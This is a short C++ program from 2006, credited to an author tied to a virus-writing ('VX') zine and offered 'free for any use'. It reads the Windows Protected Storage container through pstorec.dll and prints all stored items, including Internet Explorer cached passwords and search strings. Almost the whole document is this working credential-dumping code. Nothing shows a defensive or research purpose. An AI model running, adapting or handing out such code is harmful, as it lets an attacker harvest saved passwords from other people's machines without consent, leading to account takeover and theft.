/*

With this short code you can read all stored data like search strings and IE cached 
passwords in the 'secure' data container in the system.
this code (should) work on all OS version of windows higher than 9x; i tried it on W2K and XP SP2

No Copyright - free for any use

Written by RadiatioN in September-October 2006

Zine and group site:
EOF - Electrical Ordered Freedom
http://www.eof-project.net

My site:
RadiatioN's VX World
http://radiation.eof-project.net

Contact:
radiation[at]eof-project[dot]net

some nice greetings to Sky my good friend :)

ATTENTION:
Based on your system where you compile this code you must edit "stdafx.h".
There is a line importing pstore.dll, just change the path to C:\WINNT or C:\WINDOWS

*/

#include "stdafx.h"

typedef HRESULT (WINAPI *PStoreCreateInstancePtr)(IPStore **, DWORD, DWORD, DWORD);

int IsUnicode(unsigned char *data, unsigned long length)
{
	for(unsigned int i=0; i<length-1; i++)
	{
		if(data[i] == 0) return 1;
	}

	return 0;
}

void GetStoredPasswords(void)
{
	HRESULT hRes;
	HMODULE hPstoreDLL;
	IPStorePtr spPStore;
	IEnumPStoreTypesPtr spEnumTypes, spEnumSubTypes;
	IEnumPStoreItemsPtr spEnumItems;
	GUID typeGUID, subtypeGUID;
	LPWSTR szItemName;
	unsigned long pcbData = 0;
	unsigned char *ppbData = NULL;
	_PST_PROMPTINFO *pi = NULL;
	char szPw[512]="";

	hPstoreDLL = LoadLibrary("pstorec.dll");
	PStoreCreateInstancePtr PStoreCreateInstance = (PStoreCreateInstancePtr)GetProcAddress(hPstoreDLL, "PStoreCreateInstance");

	hRes = PStoreCreateInstance(&spPStore, 0, 0, 0);
	hRes = spPStore->EnumTypes(0, 0, &spEnumTypes);

	while(spEnumTypes->raw_Next(1, &typeGUID, 0) == S_OK)
	{
		printf("TypeGUID = %.8x\r\n", typeGUID);
		
		hRes = spPStore->EnumSubtypes(0, &typeGUID, 0, &spEnumSubTypes);		

		while(spEnumSubTypes->raw_Next(1, &subtypeGUID, 0) == S_OK)
		{
			printf("\tSubtypeGUID = %.8x\r\n", subtypeGUID);
			
			hRes = spPStore->EnumItems(0, &typeGUID, &subtypeGUID, 0, &spEnumItems);

			while(spEnumItems->raw_Next(1, &szItemName, 0) == S_OK)
			{
				printf("\t\tItemName = %ws\r\n", szItemName);
				
				pcbData = 0;
				ppbData = NULL;
				pi = NULL;

				hRes = spPStore->ReadItem(0, &typeGUID, &subtypeGUID, szItemName, &pcbData, &ppbData, pi, 0);

				if(IsUnicode(ppbData, pcbData))
				{
					printf("\t\tItemData = %ws\r\n",ppbData);					
				}
				else
				{
					printf("\t\tItemData = %s\r\n",ppbData);
				}
			}
		}
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	GetStoredPasswords();

	_getch();

	return 0;
}
